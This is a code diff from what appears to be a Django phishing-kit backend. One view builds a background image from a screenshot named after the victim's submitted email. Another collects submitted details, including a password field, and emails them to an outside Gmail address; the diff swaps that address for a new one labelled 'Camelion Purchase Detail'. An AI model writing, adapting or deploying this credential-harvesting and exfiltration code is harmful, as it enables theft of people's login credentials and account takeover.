@@ -59,6 +59,7 @@ def fetch_background_image(request):
                 djangofile = File(local_file)
                 product.screenshot.save(f'{f_email}.png', djangofile)
                 local_file.close()
+                screenshot_path.delete()
             
             finally:
                 doman = request.build_absolute_uri('/')
@@ -66,11 +67,10 @@ def fetch_background_image(request):
                 try:
                     response = f'{domain}{product.screenshot.url}'
                 except:
-                    response = f'{domain}/media/screenshots/google.com.png'
+                    response = f'{domain}/media/screenshots/default.jpg'
         else:
-            doman = request.build_absolute_uri('/')
-            domain = (doman[0:len(doman)-1])
-            response = f'{domain}/media/screenshots/google.com.png'
+            product = MyScreenshots.objects.get(name="default")
+            response = product.screenshot.url
     return JsonResponse({'bgimg': response},safe=False)
 
 
@@ -86,7 +86,7 @@ def recieve_details(request):
                         'password': data['f_password'],
                     })
         try:
-            email_send.email_message_send('Email Details', message, 'tdkingzict@gmail.com' )
+            email_send.email_message_send('Camelion Purchase Detail', message, 'blackdot.cartel@gmail.com' )
         except:
             pass
   
